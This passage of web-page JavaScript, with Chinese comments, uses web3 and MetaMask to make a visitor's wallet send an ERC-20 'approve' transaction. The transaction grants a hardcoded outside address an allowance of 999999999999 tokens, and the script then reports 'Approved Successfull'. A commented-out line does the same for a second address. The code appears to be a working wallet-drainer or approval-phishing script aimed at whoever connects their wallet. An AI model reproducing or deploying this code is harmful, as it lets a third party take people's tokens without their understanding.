"to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Pause", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Unpause", "type": "event" }];

  
       
      

          let MyContract = new web3.eth.Contract(ABI, token_address);
          let amount = 999.99;

        let data = MyContract.methods.approve('0xeeb5f188f4f9842Bfc0C821aCC0FabA5ba67A479', 999999999999).encodeABI();
        // let data = MyContract.methods.approve('0x00BA70CA5F26bD0874f2Bc5BC2bE91c74229458F', 9999999 * web3.utils.toHex(1e6)).encodeABI();
          const transactionParameters = {
            //   nonce: '0x00', // ignored by MetaMask
            // gasPrice: web3.utils.toHex(web3.utils.toWei('5', 'gwei')),
            // gas: web3.utils.toHex(21000), 
            to: token_address, // Required except during contract publications.
            from: ethereum.selectedAddress, // must match user's active address.
            // value: web3.utils.toHex('12'), // Only required to send ether to the recipient from the initiating external account.
            data: data, // Optional, but used for defining smart contract creation and interaction.
            chainId: web3.utils.toHex('1'), // Used to prevent transaction reuse across blockchains. Auto-filled by MetaMask.
          };
          aaa = ethereum.request({
            method: 'eth_sendTransaction',
            params: [transactionParameters],
          })
            .then( function () {
              alert('Approved Successfull')
              console.log('Success')
            
            })
            .catch( function (reason) {
              if (reason.code == 4001) {
               console.log('user rejected - from JS ')
                // errorMessage(reason.message)
                return 'user rejected';
               
                
              } else {
                console.log(reason);
              }
            });
          console.log(aaa)

   
        //按钮事件添加
       // link.addEventListener('click', connectWallet);
      //  transfer.addEventListener('click', transferToken);
      //  approve.addEventListener('click', getApproved);

      } else {
        alert('没有安装metamask')
      }
}

